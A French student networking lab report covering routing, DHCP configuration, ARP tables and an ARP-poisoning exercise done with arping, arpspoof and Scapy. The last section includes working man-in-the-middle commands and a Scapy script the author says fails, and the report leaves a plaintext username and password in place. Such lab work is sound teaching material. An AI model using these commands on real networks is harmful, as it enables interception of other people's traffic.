# I. Routage

### 🌞 Configuration de router.tp2.efrei
```
[root@localhost ~]# ping google.com
PING google.com (216.58.213.78) 56(84) bytes of data.
64 bytes from par21s18-in-f14.1e100.net (216.58.213.78): icmp_seq=1 ttl=117 time=34.8 ms
64 bytes from lhr25s01-in-f14.1e100.net (216.58.213.78): icmp_seq=2 ttl=117 time=41.0 ms
64 bytes from lhr25s01-in-f78.1e100.net (216.58.213.78): icmp_seq=3 ttl=117 time=53.7 ms
64 bytes from par21s18-in-f14.1e100.net (216.58.213.78): icmp_seq=4 ttl=117 time=46.7 ms
64 bytes from lhr25s01-in-f14.1e100.net (216.58.213.78): icmp_seq=6 ttl=117 time=42.8 ms
^C
--- google.com ping statistics ---
6 packets transmitted, 5 received, 16.6667% packet loss, time 5019ms
rtt min/avg/max/mdev = 34.844/43.803/53.719/6.254 ms
```
```
[root@localhost ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:22:af:73 brd ff:ff:ff:ff:ff:ff
    inet 192.168.230.151/24 brd 192.168.230.255 scope global dynamic noprefixroute enp0s3
       valid_lft 1678sec preferred_lft 1678sec
    inet6 fe80::a00:27ff:fe22:af73/64 scope link
       valid_lft forever preferred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0d:8a:25 brd ff:ff:ff:ff:ff:ff
    inet 10.2.1.254/24 brd 10.2.1.255 scope global noprefixroute enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe0d:8a25/64 scope link
       valid_lft forever preferred_lft forever
4: enp0s9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:20:c0:15 brd ff:ff:ff:ff:ff:ff
    inet 10.3.207.165/16 brd 10.3.255.255 scope global dynamic noprefixroute enp0s9
       valid_lft 172678sec preferred_lft 172678sec
    inet6 fe80::f280:91ec:d274:83c7/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
```
<br>

### 🌞 Configuration de node1.tp2.efrei
```
PC1> ip 10.2.1.1/24
Checking for duplicate address...
PC1 : 10.2.1.1 255.255.255.0

PC1> sh ip

NAME        : PC1[1]
IP/MASK     : 10.2.1.1/24
GATEWAY     : 0.0.0.0
DNS         :
MAC         : 00:50:79:66:68:00
LPORT       : 10011
RHOST:PORT  : 127.0.0.1:10012
MTU:        : 1500
```
```
PC1> ping 10.2.1.254
84 bytes from 10.2.1.254 icmp_seq=1 ttl=64 time=6.384 ms
84 bytes from 10.2.1.254 icmp_seq=2 ttl=64 time=5.231 ms
84 bytes from 10.2.1.254 icmp_seq=3 ttl=64 time=4.155 ms
84 bytes from 10.2.1.254 icmp_seq=4 ttl=64 time=6.796 ms
84 bytes from 10.2.1.254 icmp_seq=5 ttl=64 time=5.534 ms
```
```
PC1> ip 10.2.1.1 10.2.1.254
Checking for duplicate address...
PC1 : 10.2.1.1 255.255.255.0 gateway 10.2.1.254
```
```
PC1> ping 8.8.8.8
84 bytes from 8.8.8.8 icmp_seq=1 ttl=116 time=52.005 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=116 time=84.939 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=116 time=40.583 ms
84 bytes from 8.8.8.8 icmp_seq=4 ttl=116 time=55.056 ms
84 bytes from 8.8.8.8 icmp_seq=5 ttl=116 time=39.495 ms
```
```
PC1> trace 1.1.1.1
trace to 1.1.1.1, 8 hops max, press Ctrl+C to stop
 1   10.2.1.254   3.267 ms  3.349 ms  4.889 ms
 2   10.3.0.1   34.535 ms  44.817 ms  26.075 ms
 3   172.26.254.251   23.401 ms  19.880 ms  21.126 ms
 4   37.49.237.49   43.359 ms  39.130 ms  69.541 ms
 5   141.101.67.75   79.264 ms  53.305 ms  69.736 ms
 6     *  *  *
 7     *  *  *
 8     *  *  *
```
<br>

### 🌞 Afficher la CAM Table du switch
```
IOU1#show mac address-table
          Mac Address Table
-------------------------------------------

Vlan    Mac Address       Type        Ports
----    -----------       --------    -----
   1    0050.7966.6800    DYNAMIC     Et0/0
   1    0800.270d.8a25    DYNAMIC     Et0/1
Total Mac Addresses for this criterion: 2
```
<br>
<br>

# II. Serveur DHCP

### 🌞 Install et conf du serveur DHCP sur dhcp.tp2.efrei
```
[root@localhost ~]# ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=23.6 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=26.2 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=117 time=25.4 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=117 time=29.5 ms
64 bytes from 8.8.8.8: icmp_seq=5 ttl=117 time=32.8 ms
64 bytes from 8.8.8.8: icmp_seq=6 ttl=117 time=21.8 ms
64 bytes from 8.8.8.8: icmp_seq=7 ttl=117 time=22.0 ms
64 bytes from 8.8.8.8: icmp_seq=8 ttl=117 time=24.1 ms
64 bytes from 8.8.8.8: icmp_seq=9 ttl=117 time=21.5 ms
64 bytes from 8.8.8.8: icmp_seq=10 ttl=117 time=27.2 ms
64 bytes from 8.8.8.8: icmp_seq=11 ttl=117 time=26.5 ms
64 bytes from 8.8.8.8: icmp_seq=12 ttl=117 time=28.5 ms
```
```
NAME=enp0s3
DEVICE=enp0s3

BOOTPROTO=static
ONBOOT=yes

IPADDR=10.2.1.253
NETMASK=255.255.255.0

GATEWAY=10.2.1.254
```
```
# adresse reseau & subnetmask
subnet 10.2.1.0 netmask 255.255.255.0 {
    # plage d'adresses attribuables
    range dynamic-bootp 10.2.1.10 10.2.1.50;
    # broadcast
    option broadcast-address 10.2.1.255;
    option routers 10.2.1.254;
}
```
<br>

### 🌞 Test du DHCP sur node1.tp2.efrei

```
PC1> ip dhcp
DDORA IP 10.2.1.10/24 GW 10.2.1.254

PC1> sh ip

NAME        : PC1[1]
IP/MASK     : 10.2.1.10/24
GATEWAY     : 10.2.1.254
DNS         :
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 43165, 43200/21600/37800
MAC         : 00:50:79:66:68:00
LPORT       : 10005
RHOST:PORT  : 127.0.0.1:10006
MTU:        : 1500
```
```
PC1> arp

08:00:27:0d:8a:25  10.2.1.254 expires in 108 seconds
```
```
PC1> ping 8.8.8.8
84 bytes from 8.8.8.8 icmp_seq=1 ttl=127 time=31.967 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=127 time=30.895 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=127 time=35.282 ms
84 bytes from 8.8.8.8 icmp_seq=4 ttl=127 time=35.442 ms
84 bytes from 8.8.8.8 icmp_seq=5 ttl=127 time=30.214 ms
```
<br>

### 🌟 BONUS
```
option domain-name-servers 1.1.1.1;
# adresse reseau & subnetmask
subnet 10.2.1.0 netmask 255.255.255.0 {
    # plage d'adresses attribuables
    range dynamic-bootp 10.2.1.10 10.2.1.50;
    # broadcast
    option broadcast-address 10.2.1.255;
    option routers 10.2.1.254;
}
```
<br>

### 🌞 Wireshark it !

> _voir DORA.pcapng_

<br>
<br>

# III. ARP
<br>

## 1. Les tables ARP

### 🌞 Affichez la table ARP de router.tp2.efrei
```
[root@localhost ~]# ip neigh show
10.2.1.10 dev enp0s8 lladdr 00:50:79:66:68:00 REACHABLE
192.168.230.2 dev enp0s3 lladdr 00:50:56:f5:45:58 REACHABLE
192.168.56.100 dev enp0s9 lladdr 08:00:27:89:bb:49 REACHABLE
192.168.56.1 dev enp0s9 lladdr 0a:00:27:00:00:19 REACHABLE
192.168.230.254 dev enp0s3 lladdr 00:50:56:f4:95:1c STALE
10.2.1.253 dev enp0s8 lladdr 08:00:27:a7:60:74 REACHABLE
```
<br>

### 🌞 Capturez l'échange ARP avec Wireshark

> _voir ARP.pcapng_

<br>

## 2. ARP poisoning

### 🌞 Envoyer une trame ARP arbitraire

> username: tstuzr  
password: paul85

(ça c'est juste pour moi mais je le laisse dans le compte rendu)
```
sudo arping -c 1 -S 10.2.1.254 -U -I eth0 10.2.1.10
[sudo] password for tstuzr: 
ARPING 10.2.1.10
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=0 time=3.669 msec
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=1 time=4.872 msec

--- 10.2.1.10 statistics ---
1 packets transmitted, 2 packets received,   0% unanswered (1 extra)
rtt min/avg/max/std-dev = 3.669/4.270/4.872/0.602 ms
```
```
ip a                                            
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:21:54:09 brd ff:ff:ff:ff:ff:ff
    inet 10.2.1.11/24 brd 10.2.1.255 scope global dynamic noprefixroute eth0
       valid_lft 42825sec preferred_lft 42825sec
    inet6 fe80::a00:27ff:fe21:5409/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever

```
```
PC1> arp

08:00:27:21:54:09  10.2.1.254 expires in 108 seconds
```

<br>

### 🌞 Mettre en place un ARP MITM
```
$sudo sysctl -w net.ipv4.ip_forward=1

$sudo arpspoof -t 10.2.1.10 10.2.1.254 -r
```
<br>

### 🌞 Capture Wireshark arp_mitm.pcap

> _Voir arp_mitm.pcapng_

<br>

### 🌞 Réaliser la même attaque avec Scapy
```
$sudo sysctl -w net.ipv4.ip_forward=1
```

```bash
#!/usr/bin/python

from scapy.all import *

def get_mac(ip):
    a, u=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5)
    pkt=a[0]
    ans=pkt.answer
    mac=ans.src
    return mac

send(Ether(dst=get_mac("10.3.2.10"))/ARP(pdst="10.3.2.10", psrc="10.3.2.254"),  inter=RandNum(10,40), loop=1)
```
Mais bon le script marche pas... alors à la place, on peut utiliser une commande scapy déja toute faite !  
```
$sudo scapy

>>> arp_mitm("10.3.2.10", "10.3.2.254")
```
